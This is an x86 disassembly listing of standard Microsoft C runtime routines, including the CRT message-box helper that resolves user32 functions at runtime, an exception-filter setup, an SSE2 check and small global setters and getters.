mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_414208, eax
pop     ebp
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
mov     dword_41420c, eax
pop     ebp
retn
mov     eax, offset off_412418
retn
push    1
call    _flsall
pop     ecx
retn
push    offset ?__cxxunhandledexceptionfilter@@ygjpau_exception_pointers@@@z
call    ds:setunhandledexceptionfilter
xor     eax, eax
retn
and     dword_414810, 0
retn
jmp     short loc_40a8b6
mov     edi, edi
push    ebp
mov     ebp, esp
sub     esp, 14h
push    ebx
push    esi
push    edi
call    __encoded_null
and     [ebp+var_4], 0
cmp     dword_414374, 0
mov     ebx, eax
jnz     loc_40b0a6
push    offset libfilename
call    ds:loadlibrarya
mov     edi, eax
test    edi, edi
jz      loc_40b157
mov     esi, ds:getprocaddress
push    offset amessageboxa
push    edi
call    esi
test    eax, eax
jz      loc_40b157
push    eax
call    __encode_pointer
mov     [esp+24h+lpprocname], offset agetactivewindo
push    edi
mov     dword_414374, eax
call    esi
push    eax
call    __encode_pointer
mov     [esp+24h+lpprocname], offset agetlastactivep
push    edi
mov     dword_414378, eax
call    esi
push    eax
call    __encode_pointer
mov     [esp+24h+lpprocname], offset agetuserobjecti
push    edi
mov     dword_41437c, eax
call    esi
push    eax
call    __encode_pointer
pop     ecx
mov     dword_414384, eax
test    eax, eax
jz      short loc_40b0a6
push    offset agetprocesswind
push    edi
call    esi
push    eax
call    __encode_pointer
pop     ecx
mov     dword_414380, eax
mov     eax, dword_414380
cmp     eax, ebx
jz      short loc_40b0fe
cmp     dword_414384, ebx
jz      short loc_40b0fe
push    eax
call    __decode_pointer
push    dword_414384
mov     esi, eax
call    __decode_pointer
pop     ecx
pop     ecx
mov     edi, eax
test    esi, esi
jz      short loc_40b0fe
test    edi, edi
jz      short loc_40b0fe
call    esi
test    eax, eax
jz      short loc_40b0f5
lea     ecx, [ebp+var_8]
push    ecx
push    0ch
lea     ecx, [ebp+var_14]
push    ecx
push    1
push    eax
call    edi
test    eax, eax
jz      short loc_40b0f5
test    [ebp+var_c], 1
jnz     short loc_40b0fe
or      [ebp+arg_8], 200000h
jmp     short loc_40b137
mov     eax, dword_414378
cmp     eax, ebx
jz      short loc_40b137
push    eax
call    __decode_pointer
pop     ecx
test    eax, eax
jz      short loc_40b137
call    eax
mov     [ebp+var_4], eax
test    eax, eax
jz      short loc_40b137
mov     eax, dword_41437c
cmp     eax, ebx
jz      short loc_40b137
push    eax
call    __decode_pointer
pop     ecx
test    eax, eax
jz      short loc_40b137
push    [ebp+var_4]
call    eax
mov     [ebp+var_4], eax
push    dword_414374
call    __decode_pointer
pop     ecx
test    eax, eax
jz      short loc_40b157
push    [ebp+arg_8]
push    [ebp+arg_4]
push    [ebp+arg_0]
push    [ebp+var_4]
call    eax
jmp     short loc_40b159
xor     eax, eax
pop     edi
pop     esi
pop     ebx
leave
retn
call    __get_sse2_info
mov     dword_41480c, eax
xor     eax, eax
retn
mov     edi, edi
push    ebp
mov     ebp, esp
mov     eax, [ebp+arg_0]
push    esi
xor     esi, esi
cmp     eax, esi
jnz     short loc_40e3ea
call    __errno
push    esi
push    esi
push    esi
push    esi
push    esi
mov     dword ptr [eax], 16h
call    __invalid_parameter
add     esp, 14h
push    16h
pop     eax
jmp     short loc_40e3f4
mov     ecx, dword_414458
mov     [eax], ecx
xor     eax, eax
pop     esi
pop     ebp
retn